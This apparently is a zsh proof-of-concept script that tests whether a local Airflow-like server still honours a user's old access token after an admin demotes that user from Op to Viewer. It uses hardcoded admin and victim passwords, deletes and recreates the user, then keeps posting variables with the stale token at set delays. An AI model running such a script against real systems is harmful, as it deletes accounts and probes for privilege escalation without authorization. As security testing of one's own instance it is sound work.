#!/bin/zsh
set -u
H=http://localhost:8083
U=$1
tk() { curl -s -X POST $H/auth/token -H 'Content-Type: application/json' -d "{\"username\":\"$1\",\"password\":\"victimpass\"}" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))"; }
post() { curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $1" -H 'Content-Type: application/json' $H/api/v2/variables -d "{\"key\":\"$2\",\"value\":\"1\",\"description\":\"\"}"; }
AT=$(curl -s -X POST $H/auth/token -H 'Content-Type: application/json' -d '{"username":"admin","password":"adminpass"}' | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")
curl -s -o /dev/null -X DELETE -H "Authorization: Bearer $AT" $H/auth/fab/v1/users/$U
curl -s -o /dev/null -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users \
  -d "{\"username\":\"$U\",\"password\":\"victimpass\",\"email\":\"$U@x.com\",\"first_name\":\"v\",\"last_name\":\"x\",\"roles\":[{\"name\":\"Op\"}]}"
VT=$(tk $U)
print -r -- "source stale-token POST variables: $(post $VT w_src_$RANDOM)"
T0=$(python3 -c "import time;print(time.time())")
curl -s -o /dev/null -X PATCH -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users/$U -d '{"roles":[{"name":"Viewer"}]}'
print -r -- "transition sent"
for i in 1 2 3 4 5 6 8 10 13 16 20 25 30 40 50 60; do
  while true; do
    NOW=$(python3 -c "import time;print(time.time())")
    [[ $(python3 -c "print(1 if $NOW-$T0 >= $i else 0)") = 1 ]] && break
    sleep 0.2
  done
  print -r -- "t+${i}s stale=$(post $VT w_f${i}_$RANDOM)"
done
